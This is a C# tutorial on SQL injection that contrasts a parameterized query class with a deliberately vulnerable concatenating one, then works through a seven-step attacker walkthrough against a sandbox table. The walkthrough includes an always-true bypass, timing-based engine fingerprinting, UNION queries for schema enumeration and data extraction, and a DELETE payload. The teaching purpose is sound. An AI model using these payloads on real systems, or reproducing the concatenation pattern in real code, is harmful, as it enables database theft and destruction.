# Chapter 9 Supplemental 02: SQL Injection and Parameterized Queries

## What This Is

Somewhere out there is a search box. Doesn't matter what it's attached to, an internal tool, a customer portal, an e-form nobody's looked at since it shipped. Somebody types a name into it, hits enter, and gets back a matching record. Perfectly ordinary. Nobody thinks twice about it.

Then somebody types something that isn't a name at all, and the database hands over every row in the table.

That's SQL injection, and the mechanism behind it is almost insultingly simple: if your code builds a SQL statement by gluing user input directly into the query text, the database has no way to tell "data someone typed" apart from "more SQL someone wrote." By the time the string arrives at the server, both are just characters. The database does exactly what the text says, because as far as it's concerned, that's the only job it has.

This project puts that fact somewhere you can actually watch it happen, against a table of Murphy's Laws that nobody will miss if things go sideways, which, by design, they eventually will.

> **Setup required.** This needs the same restored `ExternalData` database as `CSharp.Ch09.Supplemental.01.AdoNetAndEntityFramework`. Go restore it from `ExternalData.bak` first if you haven't, and keep that backup handy, because the walkthrough below ends with a step that deletes a table's worth of rows on purpose.

> **Read this next part and mean it.** Everything below is demonstrated against `ExternalData`, a sandbox that exists specifically to be broken and restored. None of it goes anywhere near production, staging, or anything you'd mind losing. If you're tempted to try any of this against a system that matters, don't. That's not a suggestion, that's the entire reason this lesson uses a table of Murphy's Laws instead of something real.

---

## How to Write This Program

The plan is two nearly-identical database classes and a console loop that runs every search through both of them, back to back, so the moment they disagree is impossible to miss.

### Step 1: Build the connection handling once, and make it identical in both classes

Both `SafeDatabaseUtility` and `UnsafeDatabaseUtility` need the same `Connect()`, the same `Disconnect()`, and the same `IDisposable` plumbing, on purpose. If the two classes looked structurally different, you could tell them apart by silhouette alone, and the entire point of this lesson is that you can't, not until someone types the wrong thing into the search box.

```csharp
public void Connect()
{
    if (connection?.State == ConnectionState.Open)
    {
        Console.WriteLine("Database already connected...");
        return;
    }

    string connectionString = ConfigurationManager.ConnectionStrings["ExternalData"]?.ConnectionString;
    if (string.IsNullOrWhiteSpace(connectionString))
        throw new DatabankException("Missing \"ExternalData\" connection string in App.config!");

    connection = new SqlConnection(connectionString);
    connection.Open();
    if (connection.State != ConnectionState.Open)
        throw new DatabankException("Failed to open database connection!");
}

public void Disconnect()
{
    command?.Dispose();
    command = null;
    if (connection == null) return;
    if (connection.State == ConnectionState.Open) connection.Close();
    connection.Dispose();
    connection = null;
}
```

Wire up the disposable pattern around them so a forgotten `using` doesn't leak a connection:

```csharp
~SafeDatabaseUtility() => Dispose(false);

public void Dispose()
{
    Dispose(true);
    GC.SuppressFinalize(this);
}

protected virtual void Dispose(bool releaseManagedObjects)
{
    if (!releaseManagedObjects) return;
    Disconnect();
}
```

Copy this exactly into both classes. None of it is where the lesson lives, it's scaffolding, and it needs to be identical so the one real difference between the two classes has nowhere to hide.

### Step 2: Write the safe version's query and parameter

```csharp
// SQL Query to Execute. Note the query text itself never contains the search value,
//   only the parameter placeholder ("@lawName") that gets added below.
private const string SqlQuery = "SELECT RTRIM(LawText) FROM dbo.MurphysLaws WHERE LawName = @lawName";
```

That's the entire query, fixed at compile time as a `const`. Nobody, ever, alters a single character of it at runtime. `@lawName` is a placeholder, not a value, and it stays that way until `ExecuteQuery()` explicitly tells `SqlCommand` what to do with it:

```csharp
public List<string> ExecuteQuery(string lawName)
{
    try
    {
        if (connection == null || connection.State != ConnectionState.Open)
            Connect();

        if (string.IsNullOrWhiteSpace(lawName))
            throw new DatabankException("No law name provided!");

        command = new SqlCommand(SqlQuery, connection);

        // The search value is added as a PARAMETER, never concatenated into the SQL
        //   text itself. SqlClient sends this to SQL Server separately from the query,
        //   as pure data, it is never interpreted as part of the SQL statement, no
        //   matter what characters it contains.
        command.Parameters.Add(new SqlParameter
        {
            ParameterName = "lawName",
            SqlDbType = SqlDbType.VarChar,
            Size = 50,
            Value = lawName
        });

        using var reader = command.ExecuteReader();
        if (!reader.HasRows) return ["No rows returned..."];

        var values = new List<string>();
        while (reader.Read()) values.Add(reader.GetString(0));
        return values;
    }
    finally
    {
        Disconnect();
    }
}
```

SQL Server parses `SqlQuery` exactly once, finds a parameter slot where `@lawName` sits, and fills it with whatever `Value` contains, tagged as data with a declared type and size. Whatever the user typed, apostrophes, semicolons, an entire second SQL statement if they're feeling ambitious, arrives as one literal value being compared against `LawName`. None of it gets a chance to be parsed as SQL, because parameterization never lets it enter the query as text at all.

### Step 3: Write the unsafe version's query and concatenation, and mean it

Same class shape, same `Connect()`, same `Disconnect()`, same `ExecuteQuery()` signature. The constant is missing something on purpose:

```csharp
// SQL Query to Execute (missing its WHERE value on purpose, see ExecuteQuery() below)
private const string SqlQuery = "SELECT RTRIM(LawText) FROM dbo.MurphysLaws WHERE LawName = ";
```

And `ExecuteQuery()` finishes the sentence for you:

```csharp
public List<string> ExecuteQuery(string lawName)
{
    try
    {
        if (connection == null || connection.State != ConnectionState.Open)
            Connect();

        if (string.IsNullOrWhiteSpace(lawName))
            throw new DatabankException("No law name provided!");

        // Here is the entire vulnerability, in one line: the value the user typed is
        //   glued directly into the SQL statement's text. SQL Server has no way to
        //   distinguish "data the user searched for" from "additional SQL the user
        //   wrote", because by the time this string reaches the database, they are
        //   the exact same thing: more SQL text.
        string sql = SqlQuery + $"'{lawName}'";

        #pragma warning disable S2077 // Explicitly demonstrating unsafe practice
        command = new SqlCommand(sql, connection);
        #pragma warning restore S2077

        using var reader = command.ExecuteReader();
        if (!reader.HasRows) return ["No rows returned..."];

        var values = new List<string>();
        while (reader.Read()) values.Add(reader.GetString(0));
        return values;
    }
    finally
    {
        Disconnect();
    }
}
```

That's the whole bug. One string concatenation and a pair of quote characters standing in for a security boundary that isn't actually there.

Notice the `#pragma warning disable S2077`. That's a static analysis rule built specifically to catch this pattern, and it fired the moment this code was written, correctly, on the first try. It had to be explicitly silenced just to get the project building. The tooling knew. It usually does. Seeing that warning in a real code review is the fire alarm, not the smoke detector, act accordingly.

Two constants, one concatenation, and you've built both the lesson and the vulnerability it teaches, in about the same number of lines either way. Parameterization isn't the clever, hard-won alternative here. It's the shorter one.

### Step 4: Resist the urge to sanitize your way out of this

Before wiring up the console loop, it's worth heading off the instinct that shows up right about here: "okay, so I'll just strip out quotes and semicolons before building the string." Don't. Hand-rolled escaping means out-thinking every quoting rule, every encoding, and every edge case in a query language you didn't write, forever, without ever slipping once. Different databases escape differently. Contexts within the same database escape differently. There will always be one more character you didn't think of, and somebody out there has already thought of it for you.

Parameterized queries win by refusing to play that game at all. The value never becomes SQL text, so there's nothing left to escape.

### Step 5: Build the console loop, and let both classes answer every question

```csharp
private static void Main()
{
    try
    {
        using var safeDb = new SafeDatabaseUtility();
        using var unsafeDb = new UnsafeDatabaseUtility();

        while (true)
        {
            Console.WriteLine("Enter a Murphy's Law name to search, or EXIT to quit...");
            string lawName = Console.ReadLine();
            if (string.IsNullOrEmpty(lawName)) continue;
            if (lawName.Equals("exit", StringComparison.OrdinalIgnoreCase)) break;

            Console.WriteLine($"{Environment.NewLine}Attempting safe (parameterized) query...");
            try
            {
                foreach (string result in safeDb.ExecuteQuery(lawName)) Console.WriteLine(result);
            }
            catch (Exception sx)
            {
                HandleException(sx, true);
            }

            Console.WriteLine($"{Environment.NewLine}Attempting unsafe (concatenated) query...");
            try
            {
                foreach (string result in unsafeDb.ExecuteQuery(lawName)) Console.WriteLine(result);
            }
            catch (Exception ux)
            {
                // Caught separately so a malformed injection attempt (a syntax error
                //   partway through the playbook, easy to do by hand) doesn't take
                //   down the whole lesson loop.
                HandleException(ux, true);
            }
        }
    }
    catch (Exception ex)
    {
        new DatabankException("Error Caught!", ex).Log();
    }
}

private static void HandleException(Exception ex, bool messageOnly = false)
{
    while (ex != null)
    {
        Console.WriteLine(messageOnly ? ex.Message : ex.ToString());
        ex = ex.InnerException;
    }
}
```

Ordinary input gets the same answer from both, and each query's `catch` block is independent, so a malformed injection attempt part-way through the walkthrough below throws an error for that one query and lets you try the next line, rather than crashing the whole loop.

---

## Thinking Like an Attacker: The Full Walkthrough

Here's the part that actually rewards running it rather than reading about it. Pretend, for the length of this section, that you don't already know the schema. All you know is that a search box somewhere probably sits in front of a query shaped roughly like:

```
SELECT [column_a] FROM [table] WHERE [column_b] = '[value]'
```

Everything else gets found out from the outside, one typed string at a time, using nothing but what's already sitting in front of you.

**Step 1: Confirm the normal case.**
Enter `Murphy's Law`. Both queries return the expected text and agree completely. This is the baseline, and it's also why "just reject apostrophes" was never going to be a real defense, legitimate names have them.

**Step 2: Test whether it's actually vulnerable.**
Enter `Murphy's Law' OR '1' = '1`. The safe query finds nothing, because there's genuinely no law named that entire bizarre string. The unsafe query returns every single row in the table. The injected `OR '1' = '1'` turned a specific comparison into a condition that's always true, and the `WHERE` clause stopped filtering anything at all.

**Step 3: Identify the database engine.**
An attacker at this point doesn't know they're talking to SQL Server. They find out by trying an engine-specific delay and watching what pauses:

```
MySQL:       Murphy's Law' AND 0 = SLEEP(5);--
SQL Server:  Murphy's Law'; WAITFOR DELAY '00:00:05';--
Oracle:      Murphy's Law' AND 0 = DBMS_SESSION.sleep(5);--
```

Whichever one makes the response take five seconds longer just told you, from the outside, with no error message required, exactly which engine is listening. This is worth sitting with for a second: a timing difference alone is enough information to leak. Nothing needs to come back in the results at all.

*A short interlude, since a real attacker wouldn't stop at "which engine":*

```
Version:        ' UNION (SELECT @@VERSION);--                (SQL Server / MySQL)
                 ' UNION (SELECT banner FROM v$version);--    (Oracle)
Host server:     ' UNION (SELECT @@SERVERNAME);--             (SQL Server)
                 ' UNION (SELECT @@HOSTNAME);--                (MySQL)
Column count:    ' ORDER BY <num>;--                          (increase <num> until it errors)
Connected user:  ' UNION SELECT SYSTEM_USER;--                (SQL Server)
                 ' UNION SELECT SYSTEM_USER();--                (MySQL)
```

None of this requires anything beyond the same single text box.

**Step 4: List the tables.**
```
' UNION (SELECT TABLE_SCHEMA + '.' + TABLE_NAME FROM INFORMATION_SCHEMA.TABLES);--
```
This returns every table in `ExternalData`: `MurphysLaws`, `Numbers`, `Phrases`, `TestItems`, `ZipCodes`. In a real breach, this is the step where a table named `useraccount` or `payments` stops being a guess and starts being a target.

**Step 5: List the columns in whichever table looked interesting.**
```
' UNION (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MurphysLaws');--
```
Returns `LawID`, `LawName`, `LawText`. The schema, which nobody handed over, is now fully known.

**Step 6: Extract everything.**
```
' UNION (SELECT RTRIM(LawName) + '|' + RTRIM(LawText) FROM dbo.MurphysLaws);--
```
Every row, dumped through what was supposed to be a lookup for exactly one. `MurphysLaws` holds nothing sensitive, which is the entire reason it's safe to demonstrate this against, but the technique doesn't know or care what table it's pointed at. Point it at a table of usernames and password hashes instead, and it does precisely the same thing.

**Step 7: Do damage.** *(Only if you're genuinely ready to restore from backup.)*
```
'; DELETE FROM dbo.MurphysLaws;--
```
Every row is gone. Restore `ExternalData` from `ExternalData.bak` to get them back. This is the step the warning at the top of this document was actually about.

Sit with the fact that all seven steps ran through the exact same input box. No special access, no compromised credentials, no inside knowledge of the schema going in, all of it was discoverable purely from the vulnerable query's own behavior. That's the actual lesson, underneath the individual tricks: one unparameterized query anywhere in an application is enough to expose the entire database sitting behind it, not just the one table the query was written against.

## Try It Yourself

Work the seven steps in order against both queries side by side. Step 2 is the single clearest moment to watch closely: same input, one query finds nothing, the other hands over the whole table. If you run Step 7, restore from `ExternalData.bak` before doing anything else with this database, that's not optional, and it's exactly why the setup warning at the top says what it says.
